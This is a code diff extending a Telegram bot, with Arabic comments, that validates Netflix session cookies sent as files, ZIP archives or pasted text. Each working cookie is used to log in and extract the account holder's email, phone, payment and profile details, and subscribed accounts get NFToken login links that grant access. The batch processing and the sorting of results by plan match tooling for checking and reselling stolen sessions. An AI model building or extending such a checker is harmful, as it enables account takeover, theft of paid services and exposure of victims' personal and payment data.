@@ -292,6 +292,11 @@ def normalize_phone_number(phone, country_code=None):
             cleaned = '40' + cleaned[1:]
         if not cleaned.startswith('40') and len(cleaned) >= 9:
             cleaned = '40' + cleaned
+    elif country_code in ["ES", "Spain"]:
+        if cleaned.startswith('0'):
+            cleaned = '34' + cleaned[1:]
+        if not cleaned.startswith('34') and len(cleaned) >= 9:
+            cleaned = '34' + cleaned
     
     if len(cleaned) >= 10:
         return f"+{cleaned}"
@@ -1092,18 +1097,22 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     lines.append("Account Filter: Premium Only")
     lines.append("Mode: Full Information")
     
+    lines.append("")
+    lines.append("=" * 65)
+    lines.append("🔑 NFToken Login Links:")
+    lines.append("")
+    
     if is_subscribed and nftoken_data and has_usable_nftoken(nftoken_data):
-        lines.append("")
-        lines.append("NFTOKEN LOGIN LINKS")
-        lines.append("-" * 40)
         mode = get_nftoken_mode(config)
-        for label, link in build_nftoken_links(nftoken_data["token"], mode):
-            lines.append(f"{label}:")
-            lines.append("")
-            lines.append(link)
+        links = build_nftoken_links(nftoken_data["token"], mode)
+        for label, link in links:
+            lines.append(f"{label}")
+            lines.append(f"{link}")
             lines.append("")
         if nftoken_data.get("expires_at_utc"):
-            lines.append(f"Valid Until: {nftoken_data['expires_at_utc']}")
+            lines.append(f"⏳ Valid Until: {nftoken_data['expires_at_utc']}")
+    else:
+        lines.append("No NFToken available for this account")
     
     lines.append("")
     lines.append("=" * 65)
@@ -1141,6 +1150,85 @@ Filter: Premium accounts only
     return message
 
 
+# ==================== TEXT COOKIE HANDLER ====================
+
+async def handle_text_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالجة الكوكيز المرسلة كنص في الشات"""
+    text = update.message.text
+    
+    # البحث عن NetflixId في النص
+    if 'NetflixId=' in text:
+        status_msg = await update.message.reply_text("🔍 Cookie detected! Processing...")
+        
+        try:
+            # استخراج الكوكيز من النص
+            bundles = extract_netflix_cookie_bundles(text)
+            
+            if not bundles:
+                await status_msg.edit_text("❌ No valid cookies found in the text. Make sure it contains NetflixId.")
+                return
+            
+            bundle = bundles[0]
+            netscape_content = bundle.get("netscape_text", "")
+            cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
+            
+            if not cookies or not has_required_netflix_cookies(cookies):
+                await status_msg.edit_text("❌ Invalid cookies - NetflixId required.")
+                return
+            
+            await status_msg.edit_text("🔄 Connecting to Netflix...")
+            
+            session = requests.Session()
+            session.cookies.update(cookies)
+            config, _ = load_config()
+            
+            response_text, status_code, info = get_account_page(session, None, 15, False)
+            
+            if status_code == 200 and info and info.get("countryOfSignup"):
+                is_subscribed = is_subscribed_account(info)
+                mode = context.user_data.get('mode', 'fullinfo')
+                
+                nftoken_data = None
+                nftoken_mode = get_nftoken_mode(config)
+                if nftoken_mode != "false" and is_subscribed:
+                    nftoken_data, _ = create_nftoken(cookies, 1)
+                
+                if mode == 'tokenonly':
+                    email = decode_netflix_value(info.get("email")) or "Unknown"
+                    result = f"""✅ Check completed successfully
+
+Account: {email}
+
+🔑 NFToken Login Links:
+
+PC Login:
+https://netflix.com/?nftoken={nftoken_data['token']}
+
+Phone Login:
+https://netflix.com/unsupported?nftoken={nftoken_data['token']}
+
+⏳ Valid Until: {nftoken_data['expires_at_utc']}
+"""
+                    await status_msg.delete()
+                    await update.message.reply_text(result)
+                else:
+                    result_lines, plan_key = format_result_beautiful(info, is_subscribed, netscape_content, "text_cookie", nftoken_data, config)
+                    result = "\n".join(result_lines)
+                    await status_msg.delete()
+                    await update.message.reply_text(result)
+                
+                stats['valid'] += 1 if is_subscribed else 0
+                stats['free'] += 0 if is_subscribed else 1
+                stats['total'] += 1
+            else:
+                await status_msg.edit_text(f"❌ Failed: HTTP {status_code}")
+                stats['failed'] += 1
+                
+        except Exception as e:
+            await status_msg.edit_text(f"❌ Error processing cookie: {str(e)[:100]}")
+            stats['failed'] += 1
+
+
 # ==================== TELEGRAM BOT HANDLERS ====================
 
 async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1155,13 +1243,14 @@ async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 📌 WHAT I DO:
    ✅ Verify Netflix cookies
-   ✅ Extract premium account details
+   ✅ Extract full account details (Email, Phone, Payment, Profiles)
 
 ⚙️ HOW TO USE:
-   1️⃣ Export cookies (.txt or .json)
-   2️⃣ Send files directly (single or ZIP)
-   3️⃣ Watch progress bar
-   4️⃣ Receive files by plan (Premium/Standard/Basic/Free)
+   1️⃣ Send Netflix cookie files (.txt or .json)
+   2️⃣ Or send ZIP archive with multiple cookies
+   3️⃣ Or paste cookie text directly in chat
+   4️⃣ Watch progress bar
+   5️⃣ Get detailed results
 
 🕹️ COMMANDS:
    /start      → Show menu
@@ -1178,22 +1267,22 @@ async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("""
 📖 HELP & INSTRUCTIONS
 
-STEP 1: Export Cookies
-   - EditThisCookie
-   - Cookie-Editor
-   - Get cookies.txt
-   - Export as JSON for best results
+STEP 1: Get Cookies
+   Use browser extension "Cookie-Editor":
+   - Install from Chrome/Firefox store
+   - Log into Netflix
+   - Click extension icon
+   - Choose "Export" -> "JSON" (NOT Netscape)
 
-STEP 2: Send Files
-   - Send single .txt or .json
+STEP 2: Send to Bot
+   - Send .txt or .json file
    - OR send ZIP with multiple files
+   - OR paste cookie text directly in chat
 
 STEP 3: Get Results
-   - PREMIUM_ACCOUNTS.txt (Premium plans)
-   - STANDARD_ACCOUNTS.txt (Standard plans)
-   - BASIC_ACCOUNTS.txt (Basic plans)
-   - FREE_ACCOUNTS.txt (Free accounts)
-   - PARTIAL_DATA.txt (Limited data)
+   - Full account details
+   - NFToken login links (PC + Phone)
+   - Account statistics
 
 🔽 USE THE MENU BUTTON FOR COMMANDS
 """)
@@ -1255,7 +1344,20 @@ async def process_single_bundle(update: Update, context: ContextTypes.DEFAULT_TY
         mode = context.user_data.get('mode', 'fullinfo')
         if mode == 'tokenonly':
             email = info.get("email", "Unknown")
-            result = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login:\n\nhttps://netflix.com/?nftoken={nftoken['token']}\n\nPhone Login:\n\nhttps://netflix.com/unsupported?nftoken={nftoken['token']}"
+            result = f"""✅ Check completed successfully
+
+Account: {email}
+
+🔑 NFToken Login Links:
+
+PC Login:
+https://netflix.com/?nftoken={nftoken['token']}
+
+Phone Login:
+https://netflix.com/unsupported?nftoken={nftoken['token']}
+
+⏳ Valid Until: {nftoken['expires_at_utc']}
+"""
             return result, None, "success" if is_sub else "free"
         else:
             result_lines, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken, config)
@@ -1514,7 +1616,20 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                         nftoken, _ = create_nftoken(cookies, 1)
                                     if mode == 'tokenonly':
                                         email = info.get("email", "Unknown")
-                                        res = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login:\n\nhttps://netflix.com/?nftoken={nftoken['token']}\n\nPhone Login:\n\nhttps://netflix.com/unsupported?nftoken={nftoken['token']}"
+                                        res = f"""✅ Check completed successfully
+
+Account: {email}
+
+🔑 NFToken Login Links:
+
+PC Login:
+https://netflix.com/?nftoken={nftoken['token']}
+
+Phone Login:
+https://netflix.com/unsupported?nftoken={nftoken['token']}
+
+⏳ Valid Until: {nftoken['expires_at_utc']}
+"""
                                         plan_key = "unknown"
                                     else:
                                         result_lines, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cf, nftoken, config)
@@ -1673,6 +1788,7 @@ def main():
     app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
     app.add_handler(CommandHandler("cancel", bot_cancel))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookie))
     
     import asyncio
     try:
